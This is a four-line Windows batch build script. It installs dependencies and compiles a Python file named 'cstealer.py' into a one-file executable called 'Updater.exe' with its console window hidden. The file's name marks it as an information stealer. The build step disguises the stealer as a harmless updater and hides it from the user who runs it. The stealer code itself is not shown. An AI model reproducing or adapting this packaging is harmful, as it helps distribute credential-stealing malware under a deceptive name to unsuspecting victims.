@cd %~dp0
@python -m pip install -U -r requirements.txt
@python -m nuitka --onefile --assume-yes-for-downloads --plugin-enable=multiprocessing --windows-disable-console --output-file=Updater.exe cstealer.py
@pause
